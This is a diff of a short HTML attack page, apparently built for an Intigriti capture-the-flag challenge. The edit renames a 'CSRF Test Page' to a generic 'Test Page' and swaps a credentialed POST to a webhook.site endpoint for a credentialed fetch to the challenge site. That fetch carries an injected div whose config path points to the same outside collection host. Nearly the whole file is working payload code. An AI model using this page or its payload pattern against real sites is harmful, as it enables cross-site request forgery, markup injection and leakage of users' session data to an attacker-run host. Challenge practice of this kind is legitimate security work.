@@ -1,19 +1,17 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CSRF Tesst</title>
+    <title>test</title>
 </head>
 <body>
-    <h1>CSRF Test Page</h1>
-    <p>This page will attempt to make a CSRF request to update the page name.</p>
+    <h1>Test Page</h1>
+    <p>This page is a test </p>
 
     <script>
-        // Method 1: Fetch API (modern browsers)
-        fetch('https://webhook.site/7dbceb0c-65a4-41d5-bde4-23b7b79daf47', {
-            method: 'POST',
+        fetch('https://challenge-0326.intigriti.io/challenge.html?q=<div%20data-component="true"%20data-config={"path":"//webhook.site/7dbceb0c-65a4-41d5-bde4-23b7b79daf47","type":""}></div>&domain=internal', {
+            method: 'GET',
             credentials: 'include' // Important: includes cookies
         });
     </script>
-    <p>Check the browser console (F12) to see the result.</p>
 </body>
 </html>
